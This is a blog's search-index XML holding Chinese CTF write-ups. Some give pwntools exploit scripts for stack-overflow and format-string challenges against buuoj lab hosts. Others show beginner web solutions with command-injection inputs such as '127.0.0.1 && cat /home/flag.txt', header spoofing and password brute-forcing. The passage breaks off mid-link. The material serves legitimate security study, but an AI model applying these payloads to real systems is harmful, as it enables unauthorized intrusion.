<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn第五周</title>
    <link href="/2023/02/14/pwn%E7%AC%AC%E4%BA%94%E5%91%A8/"/>
    <url>/2023/02/14/pwn%E7%AC%AC%E4%BA%94%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>check发现nx开了不能用shellcode（<a href="https://blog.csdn.net/weixin_43916678/article/details/107181228?ops_request_misc=&request_id=&biz_id=102&utm_term=shellcode&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-107181228.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev1%5Einsert_chatgpt&spm=1018.2226.3001.4187">shellcode</a>是一段用于利用软件漏洞而执行的代码）</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676383399600-1a270c62-0f54-4ae8-88bc-c6172937e4aa.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676383413138-8f700668-0baa-41fe-b664-3bf6f8a5496a.png" alt="img"></p><p>20个I 可以填满s溢出</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676384961526-d95b0879-cb11-4d5f-a62f-3412efd2afc0.png" alt="img"></p><p>发现函数get_flag<img src="/./../imgs/$%7Bfiilename%7D/1676385087423-9ed24c00-304f-47fe-af46-ec2c7617cc2b.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676385102469-8089293c-9884-4380-9c78-74acb2f947d4.png" alt="img"></p><p>所以写exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>r = remote(&#x27;node4.buuoj.cn&#x27;,28324)<br><br>payload = b&#x27;I&#x27;*20+b&#x27;A&#x27;*4+p64(0x8048F0D)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>check发现nx开了</p><p>64位打开发现</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676385795891-1d3e7bfc-6c0c-4362-94db-93110574cd1d.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676385812098-7d580d86-2dd2-403b-b227-af5c3e63122c.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676386320739-f42af5c4-7904-4ca8-b73e-19a8e8bec7b2.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676385876690-f3366c63-ebee-4df2-94a3-31109e07fd81.png" alt="img"></p><p>找到system开始栈溢出</p><p>写exp:（.decode(“iso-8859-1”)这个后缀有时不加会链接失败，目前我也不太清楚)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>r = remote(&#x27;node4.buuoj.cn&#x27;,27782)<br><br>offset = 0x80 + 8#偏移量看上边的buf大小<br>payload = offset*&#x27;a&#x27; + p64(0x400596).decode(&quot;iso-8859-1&quot;)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>check发现nx和stack都开了</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676472380812-7b6ed972-791f-4ec1-8a60-860342fa5e28.png" alt="img"></p><p>存在read函数，但buf长度位70h，并不存在栈溢出，但存在一个printf()函数，存在格式化字符串漏洞</p><p>也即是说将unk_804c044内容修改，这样我们可以使得if判断成功执行system(“&#x2F;bin&#x2F;sh”)</p><p>输入AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p发现偏移量10<img src="/./../imgs/$%7Bfiilename%7D/1676473406249-7a7a075a-e3db-423e-84ec-8bae281acb44.png" alt="img"></p><p>获取unk_804C044地址为0x0804C044，写exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>io = remote(&#x27;node4.buuoj.cn&#x27;,26770)<br>payload = p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)+b&#x27;%10$n%11$n%12$n%13$n&#x27;<br>io.sendline(payload)<br>io.sendline(str(0x10101010))<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn第四周</title>
    <link href="/2023/02/13/pwn%E7%AC%AC%E5%9B%9B%E5%91%A8/"/>
    <url>/2023/02/13/pwn%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<p>先不着急，先从基本的知识积累，做做buuctf的pwn题</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>先check file下查看伪代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676254421466-6038a851-e93a-4e03-b098-8344d2f29477.png" alt="img"></p><p>main()函数按F5查看伪代码，发现危险函数gets，可以判断存在栈溢出漏洞，点开看下s分配字节（0x0-(-0x0f)&#x3D;0xf）</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676254387125-ebe0f511-045a-4dfe-923f-47bcc8f358f6.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676255753116-a39fa62d-24c0-4e2e-b291-26d51e706817.png" alt="img">点开又发现fun函数里面有system 接下来思路就清晰了，我们需要利用gets函数获取一个长字符串覆盖rip来控制程序流到fun()函数</p><p><img src="/./../imgs/$%7Bfiilename%7D/1676255649034-b278e395-a80f-4f6e-b3bc-8545a54154de.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676255662429-6311415f-2f7c-49e3-849b-4767b40d4032.png" alt="img">因为是64位的EIF文件，所以rbp是8个字节，看到地址后写exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *  <br>p=remote(&quot;node4.buuoj.cn&quot;,26286) #靶机地址和端口<br>payload=&#x27;A&#x27;*15+&#x27;B&#x27;*8+p64(0x401186+1).decode(&quot;iso-8859-1&quot;)<br>#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。<br>p.sendline(payload)/#发送漏洞<br>p.interactive()#远程交互<br></code></pre></td></tr></table></figure><p><img src="/./../imgs/$%7Bfiilename%7D/1676256909089-1eeba1bb-98dc-4cd3-8ded-1ad02b157f87.png" alt="img"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p><img src="/./../imgs/$%7Bfiilename%7D/1676257024838-97745ad7-b8af-4bae-ace2-1a72967f165c.png" alt="img"></p><p>打开<img src="/./../imgs/$%7Bfiilename%7D/1676261068955-fa3e3842-d60f-4ead-bcd9-e85e2a03ae1b.png" alt="img"></p><p>代码分析：俩个write函数输出，然后sprintf函数利用%p将sub_40060函数地址（其实就是system函数）打印出来放到s里面，然后由write函数打印出来，由于是64位所以write那是9</p><p>左边看函数发现<img src="/./../imgs/$%7Bfiilename%7D/1676257311962-84e66ce0-7157-4bda-b013-3632bc3f9863.png" alt="img"></p><p><img src="/./../imgs/$%7Bfiilename%7D/1676257828411-cd14cdf6-145c-4882-8880-ed25046ce2ab.png" alt="img"></p><p>所以找偏移量由主函数得0x40+8，</p><p>只要我们能控制程序返回到0x000400611，就可以得到flag了。</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain"># coding: utf-8<br>from pwn import *<br><br>r = remote(&#x27;node4.buuoj.cn&#x27;,28066)<br><br>offset = 0x40+8#偏移量<br>payload = offset*&#x27;a&#x27; + p64(0x000400611).decode(&quot;iso-8859-1&quot;)#漏洞<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>注意漏洞.decode(“iso-8859-1”)这个后缀必须加上</p><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>64位只开了nx，后边我就不上截图了<img src="/./../imgs/$%7Bfiilename%7D/1676259341442-8701e331-44e9-4e3a-a9df-bca2ebb79acd.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676259486035-9a665626-4180-4cc6-8249-1be964ec18f0.png" alt="img"><img src="/./../imgs/$%7Bfiilename%7D/1676260009861-6558d607-a1cb-487e-97de-0db06f7623a1.png" alt="img">程序分析：有一个gets函数输入v1的值，但是判断的却是v2是否与11.28125相等，只有相等就直接可以获得权限，所以要想办法绕过。</p><p>发现存在gets函数，加上本题没有开启canary保护，只要能找到cat flag地址就可以直接栈溢出到返回地址。其中偏移量看v2 的大小，地址找到system的地址，所以写exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain"># coding: utf-8<br>from pwn import *<br><br>r = remote(&#x27;node4.buuoj.cn&#x27;,28025)<br><br>offset = 0x30 + 8<br>payload = offset*&#x27;a&#x27; + p64(0x000004006BE ).decode(&quot;iso-8859-1&quot;)    #直接gets函数溢出，然后修改返回地址<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn第三周</title>
    <link href="/2023/02/05/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
    <url>/2023/02/05/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><p>先check下</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675595501418-31ddcfc7-7af5-4325-8fe3-49b2b77029aa.png" alt="img"></p><p>拖进去反汇编</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675595479745-7570befe-1f2f-4739-b84b-380a95be03bd.png" alt="img"></p><p>查看字符串</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675595238591-971158b1-3ab9-4a17-b5d0-f6f0e14139b6.png" alt="img"></p><p>看main的伪代码，“rand() % 6 + 1”的含义就是获取1~6的伪随机数。</p><p>可以看出这个猜数游戏会进行十个回合，如果十个回合都能猜对数的话，就可以调用sub_C3E函数，而这个sub_C3E函数中就有system(“cat flag”)</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675595603152-55228bd2-4e98-4e8c-aae7-e7e5ec35e1e7.png" alt="img"></p><p>由于开启了栈保护，所以没法直接覆盖返回地址来进入sub_C3E，但是输入name时，用了gets，利用gets栈溢出，尝试覆盖掉seed，使种子值已知，这样就能得到rand的值，之后只要循环输入十次就能拿到flag。</p><p>解题思路：</p><p>（1）输入name时，通过gets溢出，覆盖掉seed的值，使seed已知</p><p>（2）写脚本，或者手动输入rand()函数产生的前10个值</p><p>（3）到达sub_C3E拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675595899490-9877e181-0031-48da-bf8e-fa5703486574.png" alt="img"></p><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>先check下</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675596437467-2d0f315c-3a9c-4526-9c81-45236f90ba4b.png" alt="img"></p><p>然后丢进IDA32，看看字符串窗口，看有没有可以利用的字符串，发现system和cat flag，且存在一些需要留意的高危函数，strcpy和read。</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675596510130-c785ab33-7a0e-4cd6-b20c-6103e5533347.png" alt="img"></p><p>点进cat flag发现有一个what_is_this函数直接用了system(“cat flag”)，也就是说只要我们想办法调用这个函数，就可以直接拿到flag。</p><p>接下来需要找漏洞，最好是可以直接覆盖一个返回地址，覆盖成what_is_this函数的地址。</p><p>main里没有什么可疑点，点进login函数，发现密码给的长度很大，read可以读0x199字节，十进制就是409，谁会用这么长的密码？这个长度很可疑，猜测从这里入手。</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675596592748-e9c162ff-7b67-4abc-b718-a8ee4935b70d.png" alt="img"></p><p>再进入check_passwd看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675596619458-904e8d38-125b-48b6-ae85-47261247d4ac.png" alt="img"></p><p>发现限制了密码长度，要求密码长度在(3,8]内，并且还发现有个strcpy(&amp;dest, s)，这个函数里的s就是密码的字符串，dest长度0x14，所以s长度远大于dest，这就会导致栈溢出。</p><p>所以思路：</p><p>（1）正常输入到输入密码的那一步</p><p>（2）绕过密码的长度检测，让dest溢出</p><p>（3）覆盖返回地址，使之变成what_is_this函数的地址</p><p>（4）拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675598324898-aa524e52-5576-4802-8285-446850703f7c.png" alt="img"></p><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p><img src="/./../imgs/$%7Bfiilename%7D/1675597195485-083b5936-0d62-4ede-958a-724801c81bb8.png" alt="img"></p><p>拖进32位IDA，先看字符串窗口。</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675597251793-04a370b6-8704-48ce-93f6-9a8e1369d3f6.png" alt="img"></p><p>只找到了system，没有cat flag或者&#x2F;bin&#x2F;sh等字符串，再结合题目描述的提示“菜鸡认为自己需要一个字符串”，猜测需要自己输入一个&#x2F;bin&#x2F;sh ，然后把它当参数传system函数里，拿到shell。</p><p>然后看伪代码，找漏洞，main里没什么可疑的，但是调用了一个hello函数，点进去看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675597269654-64e92129-8086-4bbe-9d17-9ca0c904705b.png"></p><p> 点进hello看看<img src="/./../imgs/$%7Bfiilename%7D/1675597293427-005c2393-553d-40e1-9d02-cecc06d78873.png" alt="img"></p><p>发现了一个会导致溢出的gets（在程序的最下方）</p><p>运行程序发现是让我们输入两次，第一次输入名字，第二次gets了你留下的讯息。</p><p>所以思路：</p><p>由于只开启了NX，那么name的地址是不变的，记下name地址，输入’&#x2F;bin&#x2F;sh’到name里</p><p>利用gets溢出，覆盖返回地址为system的函数地址</p><p>把name作为参数传给system，构成system(“&#x2F;bin&#x2F;sh”)</p><p>ls看文件，cat flag拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1675597478120-9682d209-1c04-4a74-bba7-f22cc9a19f3c.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn第二周</title>
    <link href="/2023/01/29/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%BA%8C%E5%91%A8/"/>
    <url>/2023/01/29/%E5%AF%92%E5%81%87pwn%E7%AC%AC%E4%BA%8C%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>首先使用checksec检查文件保护机制，是多少位的程序。64位程序，栈不能执行（<a href="https://www.jianshu.com/p/755e52d48a77">checksec</a>  <a href="https://cloud.tencent.com/developer/article/2129106">exp</a>）</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674954050530-3b6f34dd-4d91-4a32-bb4d-71bd28ea59a5-1674974676968-31.png" alt="img"></p><p>丢进64位ida，f5查看伪代码，</p><p>输出字符串helloWord之后执行vulnerable_function()函数，没有与用户交互。</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674974519330-11eef6cf-807c-43f9-887e-57ed6efbfe2e.png" alt="img"></p><p>进入vulnerable_function函数，通过伪代码分析逻辑，发现了栈溢出漏洞。</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674974541836-4085f14a-732c-4e75-b95e-9c1516ad1623.png" alt="img"></p><p>发现buf数组只有0x80字节，但是read函数从中读了0x200个。</p><p>或许咱们能够进行溢出，覆盖掉返回地址，劫持程序执行流，执行咱们想执行的方法。一般咱们的目的是去执行 system(“&#x2F;bin&#x2F;sh”)。</p><p>发现可疑函数，拥有system(“&#x2F;bin&#x2F;sh”)</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674974555091-c3e92ce1-8fa1-4efc-b1c1-0df9278a2198.png" alt="img"></p><p>所以我们能够把返回地址改为callsystem的地址，从而实现漏洞的利用，获取后门后，get了shell，直接ls+cat flag即可获得</p><p>仿照网上的exp写了一遍</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674970572283-7c78acee-b94e-450d-abab-179545d60723-1674974676969-36.png" alt="img"></p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="/./../imgs/$%7Bfiilename%7D/1674971513761-13407fe0-be41-4d48-be56-e20f6b612b4c.png" alt="img"></p><p>丢进32位ida，shift+f12进字符串窗口，看看有没有可以直接利用的字符串。<br>发现有system和&#x2F;bin&#x2F;sh可以利用，猜测需要<strong>溢出覆盖system函数参数，使其变成system(“&#x2F;bin&#x2F;sh”)</strong> 来获取shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674971937320-60276974-a283-474a-a517-6f088e3801f8.png" alt="img"></p><p>看main函数，点进去进vulnerable_function函数看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674971871535-9fe94f6a-3280-4855-85cf-7568efff5345.png" alt="img"></p><p><img src="/./../imgs/$%7Bfiilename%7D/1674971831576-593233dc-4207-4b21-b0f5-2b13179896ee.png" alt="img"></p><p><img src="/./../imgs/$%7Bfiilename%7D/1674972075385-cfe24929-4950-43f9-a7dc-91300db7f85b.png" alt="img"></p><p>发现buf长度为0x88，但read了0x100，且并没有输入限制，存在溢出漏洞</p><p>思路：填充字符使buf溢出<br>溢出后将read函数的返回地址覆盖为system的地址 ，进入我们构造的伪栈帧<br>覆盖system的参数，使其变为”&#x2F;bin&#x2F;sh”<br>拿到shell，然后寻找flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674972610246-a66b867e-92f4-4cff-99a7-cf002b145f18.png" alt="img"></p><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>依旧是先放到linux里扫一下，看看文件属性及开启的保护措施<br>开了canary和nx，即没法直接覆盖返回地址和使用shellcode，题目里提示了prinf的作用，可以着重看看prinf</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674972905462-7023fabe-6c2e-43a7-871b-1f05b161b7b6.png" alt="img"></p><p>用32位IDA打开，和上题一样查看字符串发现既有system，也有cat flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674973008182-2163b201-23b8-460c-bd46-4dea1f9b92e4.png" alt="img"></p><p>看主函数伪代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674973067543-26dcd3eb-3ce7-4c62-96e5-90daff2bc59a.png" alt="img"></p><p>汇编学的少看的不太懂，上网搜的大神的讲解：</p><p>这个程序流程就是让你输入你的名字和要留下的信息，它就会说你好，并用printf输出你留下的信息。</p><p>如果pwnme的值为8，那么判断成立就会直接执行system(“cat flag”)拿到flag，否则输出Thank you。</p><p>第23行的这个printf不是正确的用法，会产生格式化字符串漏洞</p><p>printf正确用法是printf(“格式化字符串，……” , 参量，……)，比如输出一个字符串a应该用printf(“%s”,a)，但如果写成了printf(a), 就会出现格式化字符串漏洞 ，如果a是”%x”，那么printf(a)就会输出它后面的内存中的数据 。</p><p>所以思路：</p><p>第一次运行程序，name随便输，在输入message时利用%x计算输入位置偏移</p><p>第二次运行程序，name随便输，在输入message时，先输入pwnme的地址</p><p>利用 %偏移$n 改变pwnme的值为8</p><p>拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/1674973360705-52e7ab45-8b58-44d2-b1be-de73d9f33378.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web</title>
    <link href="/2023/01/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/"/>
    <url>/2023/01/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
    
    <content type="html"><![CDATA[<h1 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h1><p>右键好像不管用了。</p><p>使用F12或ctrl+u或在url前添加view-source:查看</p><h1 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h1><p>打开网站，手动进入&#x2F;robots.txt，提示f1ag_1s_h3re.php，然后再打开&#x2F;f1ag_1s_h3re.php即可找到flag。</p><p>robots协议是网站跟爬虫间的协议 ，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，一般站点根目录下都会放置robots.txt，爬虫爬取前会检查这个文件。</p><h1 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h1><p>打开发现：你知道index.php的备份文件名吗？&#x2F;index.php.bak即可下载带有flag的php文件</p><p>常见的备份文件后缀名为.bak</p><p><a href="https://blog.csdn.net/akdjfhx/article/details/126454090">https://blog.csdn.net/akdjfhx/article/details/126454090</a></p><h1 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h1><p>1.进入&#x2F;cookie.php然后查看http回响</p><p><a href="http://tnblog.net/18328907536/article/details/6567">http://tnblog.net/18328907536/article/details/6567</a></p><p><a href="http://www.360doc.com/content/22/0611/11/4703094_1035569390.shtml">http://www.360doc.com/content/22/0611/11/4703094_1035569390.shtml</a></p><p>2.用burp查看</p><p>cookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。因此，服务端脚本就可以读、写存储在客户端的cookie的值。</p><h1 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h1><p>查看源代码，发现disable使flag不能点击然后右键edit HTML删除点击箭头然后flag可以点击</p><p>elements的编辑功能</p><h1 id="6-get-post"><a href="#6-get-post" class="headerlink" title="6.get_post"></a>6.get_post</h1><p>get和post方式提交变量</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image-1673779494364-1.png"></p><h1 id="7-weak-auth"><a href="#7-weak-auth" class="headerlink" title="7.weak_auth"></a>7.weak_auth</h1><p>登录页面利用burp爆破密码，这里不用下载字典，<a href="https://blog.csdn.net/qq_29122883/article/details/112346687">设置下参数</a>即可查找数字密码</p><p>当然先蒙个123456发现进去了</p><h1 id="8-simple-php"><a href="#8-simple-php" class="headerlink" title="8.simple_php"></a>8.simple_php</h1><p>满足条件即得flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(2)-1673779632384-3.png"></p><p><a href="https://www.runoob.com/php/php-is_numeric-function.html">is_numeric()</a>函数用于检测变量是否为数字或数字字符串。</p><p>exit() 函数输出一条消息，并退出当前脚本。该函数是 <a href="https://www.runoob.com/php/func-misc-die.html">die()</a> 函数的别名。</p><p><a href="https://blog.csdn.net/weixin_43836806/article/details/107340486">强相等和弱相等和is_number绕过</a></p><p><a href="https://cloud.tencent.com/developer/information/php%20%E5%BC%B1%E7%AD%89%E4%BA%8E%E9%97%AE%E9%A2%98">弱类型</a></p><h1 id="9-command-execution"><a href="#9-command-execution" class="headerlink" title="9.command_execution"></a>9.command_execution</h1><p>先试试，ping本地，ping 127.0.0.1发现可以ping通。<br>127.0.0.1 &amp;&amp; ls 发现可以执行（注意格式有空格）</p><p>然后我们用find命令找到所有的txt文本，再用cat打开flag.txt即可。<br>127.0.0.1 &amp;&amp; find &#x2F; -name “*.txt”<br>127.0.0.1 &amp;&amp; cat &#x2F;home&#x2F;flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(3)-1673782947137-5.png"></p><p><a href="https://www.freesion.com/article/71711425298/">ping命令</a></p><h1 id="10-xff-referer"><a href="#10-xff-referer" class="headerlink" title="10.xff_referer"></a>10.xff_referer</h1><p>burp抓包后放包，在目标里发送至repeater，添加伪造X-Forwarded-For:123.123.123.123  如图</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(5)-1673838048659-9.png"></p><p>看到回响，添加Referer:<a href="https://www.google.com发送得到flag/">https://www.google.com发送得到flag</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(6)-1673838204082-11.png"></p><p><a href="https://cloud.tencent.com/developer/article/2038008">burp抓包</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(4)-1673837542615-7.png"></p><p>Referer是<a href="https://so.csdn.net/so/search?q=HTTP%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020">HTTP协议</a>中的一个请求报头，用于告知服务器用户的来源页面</p><h1 id="11-simple-js"><a href="#11-simple-js" class="headerlink" title="11.simple_js"></a>11.simple_js</h1><p>输入密码进不去，看源代码，发现十六进制字符串，解码后十进制ascil码转换得flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(13).png"></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(12).png"></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(14).png"></p><p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167384744016800188542245%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167384744016800188542245&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-91490695-null-null.142%5Ev71%5Eone_line,201%5Ev4%5Eadd_ask&utm_term=simple_js&spm=1018.2226.3001.4187">js前端分析</a></p><h1 id="12-baby-web"><a href="#12-baby-web" class="headerlink" title="12.baby_web"></a>12.baby_web</h1><p>题目说想想初始页面是什么，看到打开是1.php，手动删除也不行，这里用burp抓包和第十题一样删除1.php后看到回响flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(9).png"></p><p>看了一篇<a href="https://blog.csdn.net/qq_53325209/article/details/123771111?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167384185216800182169641%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167384185216800182169641&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123771111-null-null.142%5Ev71%5Eone_line,201%5Ev4%5Eadd_ask&utm_term=baby_web&spm=1018.2226.3001.4187">大佬文章</a>，在网页也可以抓包看回响</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(10).png"></p><p>burp和开发者工具的编辑抓包得回响的功能</p><h1 id="13-Training-WWW-Robots"><a href="#13-Training-WWW-Robots" class="headerlink" title="13.Training-WWW-Robots"></a>13.Training-WWW-Robots</h1><p>打开网站，手动进入&#x2F;robots.txt，提示f10g.php，然后再打开&#x2F;f10g.php即可找到flag</p><h1 id="14-ics-06"><a href="#14-ics-06" class="headerlink" title="14.ics-06"></a>14.ics-06</h1><p>进入页面，发现除了点击“报表中心”，其他均无反应。尝试改变日期范围，无果。改变思路，看到URL链接中id&#x3D;1，猜想可能存在爆破的可能，故使用burpsuite对id的参数值进行爆破。</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(11)-1673845698856-18.png"></p><p>改为id&#x3D;2333或者查看回响得到flag</p><p>为什么用burp爆破呢，我也是查看了一位<a href="https://blog.csdn.net/m0_46267075/article/details/124994385?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167384446116782425673316%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167384446116782425673316&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-124994385-null-null.142%5Ev71%5Eone_line,201%5Ev4%5Eadd_ask&utm_term=ics-06&spm=1018.2226.3001.4187">大佬</a>，思路可以记一下</p><h1 id="15-PHP2"><a href="#15-PHP2" class="headerlink" title="15. PHP2"></a>15. PHP2</h1><p>御剑扫描出来index.php,打开什么也没有，用phps</p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(8).png"></p><p><img src="/./../imgs/$%7Bfiilename%7D/Image%20(7).png"></p><p>这里的绕过可以参看这位<a 